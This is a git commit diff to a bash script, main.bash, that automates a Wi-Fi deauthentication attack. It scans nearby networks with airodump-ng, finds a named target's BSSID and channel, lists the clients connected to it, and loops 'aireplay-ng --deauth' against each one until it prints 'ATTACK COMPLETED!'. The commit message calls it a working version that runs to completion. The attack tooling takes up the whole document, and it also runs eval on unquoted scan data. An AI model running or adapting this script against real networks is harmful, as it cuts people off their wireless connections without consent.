0e3ad85c85759718d024863fb3f45d7b9579661d
root <root@localhost.localdomain>
2018-09-04 21:53:14 +0000

    Working version. Attack is automated and runs to completion. Suppressed output from gnome-terminal and kill commands, and tidied up runtime information.

--- main.bash
+++ main.bash
@@ -7,6 +7,7 @@ TARGET_BSSID=0
 TARGET_CHANNEL=0
 COUNTER=0
 
+
 #Flag handler
 while getopts "b:c:hi:st:" opt; do
 	case $opt in
@@ -24,7 +25,7 @@ while getopts "b:c:hi:st:" opt; do
 			WLAN=$OPTARG
 			;;
 		s)
-			echo "skipping automatic scanning"
+			echo "Skipping automatic scanning..."
 			SKIP_SCAN=1
 			;;
 		t) 
@@ -32,36 +33,29 @@ while getopts "b:c:hi:st:" opt; do
 			;;
 	esac
 done
+#Sanity check
 echo "Interface set as: $WLAN"
 echo "Target wifi set as: $TARGET"
 
 if [ $SKIP_SCAN -eq 0 ]; then
 	#Clear previous runs
-	#rm -rf /runfiles/
 	rm -f runfiles/initscan-01.csv
-
-	Counter=0
 
 	#Log initial BSSIDs
 	mkdir -p runfiles
-	gnome-terminal -e "bash -c \"airodump-ng -w runfiles/initscan --output-format csv $WLAN; exec bash\""
+	gnome-terminal -e "bash -c \"airodump-ng -w runfiles/initscan --output-format csv $WLAN; exec bash\"" &> /dev/null
 	sleep 15
-	kill $(ps aux | grep 'airodump-ng' | awk '{print $2}')> /dev/null
+	kill $(ps aux | grep 'airodump-ng' | awk '{print $2}') &> /dev/null
 
 	#Search BSSIDs for target
 	MATCHING_LINES=$(grep $TARGET runfiles/initscan-01.csv)
-	echo "###DEBUG###"
-	echo "$MATCHING_LINES"
-	echo "###DEBUG###"
-
-	#echo $2 $MATCHING_LINES
 
 	#Check the number of matching networks and act accordingly
 	if [ $(grep $TARGET runfiles/initscan-01.csv | wc -l) -eq 0 ]; then
 		echo "ERROR: no matches."
 		exit
 	elif [ $(grep $TARGET runfiles/initscan-01.csv | wc -l) -ne 0 ]; then
-		echo "ERROR: more than one match. Attacking first match."
+		echo "WARNING: more than one match. Attacking first match."
 		TEMP_MATCHING_LINES=$(echo $MATCHING_LINES | head -n 1)
 		MATCHING_LINES=$TEMP_MATCHING_LINES
 	else
@@ -71,10 +65,9 @@ if [ $SKIP_SCAN -eq 0 ]; then
 	#Gotta trim the BSSID and channel or commas will screw with everything
 	UNTRIMMED_TARGET_BSSID=$(echo $MATCHING_LINES | awk '{print $1;}')
 	TARGET_BSSID=${UNTRIMMED_TARGET_BSSID::-1}
-	echo "$TARGET_BSSID"
 	UNTRIMMED_TARGET_CHANNEL=$(echo $MATCHING_LINES | awk '{print $6;}')
 	TARGET_CHANNEL=${UNTRIMMED_TARGET_CHANNEL::-1}
-	echo "$TARGET_CHANNEL"
+	echo "The target is associated with $TARGET_BSSID and was found on channel $TARGET_CHANNEL."
 else
 	if [ $TARGET_BSSID -eq 0 ] || [ $TARGET_CHANNEL -eq 0 ] ; then
 		echo "Incorrect arguments"
@@ -84,13 +77,12 @@ fi
 
 #Log specific clients on wifi network
 rm -f runfiles/specificscan-01.csv
-gnome-terminal -e "bash -c \"airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w runfiles/specificscan --output-format csv $WLAN; exec bash\""
-sleep 15
-kill $(ps aux | grep 'airodump-ng' | awk '{print $2}')> /dev/null
+gnome-terminal -e "bash -c \"airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w runfiles/specificscan --output-format csv $WLAN; exec bash\"" &> /dev/null
+sleep 25
+kill $(ps aux | grep 'airodump-ng' | awk '{print $2}') &> /dev/null
 
 #Open new terminal to capture channel. 
-gnome-terminal -e "bash -c \"airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID $WLAN; exec bash\""
-#gnome-terminal -e `airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID wlan0`
+gnome-terminal -e "bash -c \"airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID $WLAN; exec bash\"" &> /dev/null
 
 sleep 1
 
@@ -100,14 +92,15 @@ while read line; do
 	#Tried to use tail but resulted in ambiguous redirect :/
 	if [ $COUNTER -lt 5 ]; then
 		COUNTER=$((COUNTER+1))
-		echo $COUNTER	
 	else
 		UNTRIMMED_TARGET=$(echo $line | awk '{print $1;}')
 		TARGET_ID=${UNTRIMMED_TARGET::-1}
+		if [ -z $TARGET_ID ]; then
+			echo "ATTACK COMPLETED! :) :) :)"
+			kill $(ps aux | grep 'airodump-ng' | awk '{print $2}') &> /dev/null
+			exit
+		fi
 		echo "KICKING: $TARGET_ID off of $TARGET_BSSID"
 		eval aireplay-ng -a $TARGET_BSSID --deauth 100 -c $TARGET_ID $WLAN
 	fi
 done < runfiles/specificscan-01.csv
-gnome-terminal -e -x bash -c ""
-
-#aireplay-ng --deauth 100 -a [SSID] -c [client] [wifi]
